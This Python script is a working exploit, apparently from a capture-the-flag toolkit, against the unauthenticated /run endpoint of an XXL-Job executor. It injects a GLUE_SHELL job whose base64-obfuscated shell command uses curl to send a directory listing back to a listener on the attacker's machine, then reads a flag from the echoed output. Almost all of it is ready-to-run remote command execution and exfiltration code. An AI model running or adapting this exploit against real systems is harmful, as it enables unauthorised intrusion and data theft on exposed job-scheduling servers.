from tool.base import match_flag, process_with,get_local_ip
from tool.bash_obf import apply_obfs
from tool.http_repeater import repeater
from tool.http_server import HttpEcho
from tool.base import wait


def run(target: tuple[str, int]):
    ip = get_local_ip()
    if not ip:
        return False, "", "ip获取失败"
    curl_cmd = f"bash -c 'curl -d $(printf %s.. $(ls /tmp)) http://{ip}:8000/'"
    cmd = apply_obfs(curl_cmd, ["base64"])
    if not cmd:
        return False, "", "apply_obfs失败"


    exp1 = f"""POST /run HTTP/1.1
Host: {target[0]}:{target[1]}
Content-Type: application/x-www-form-urlencoded;

{{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "{cmd}",
  "glueUpdatetime": 1586629003727,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}}
"""


    with HttpEcho() as echo:
        resp = repeater(exp1)
        if not resp:
            return False, "", resp.error


        if not wait(lambda: bool(_ := echo.echo())):
            return False, "", "等待 echo 超时"
        text = echo.echo()
        flag = match_flag(text)
        if not flag:
            print(text)
            return False, "", "flag匹配失败"
        return True, flag, ""


def main(ip_port: str):
    process_with(ip_port, run)


if __name__ == "__main__":
    from tool.base import set_debug
    set_debug()
    main("192.168.192.148:42609")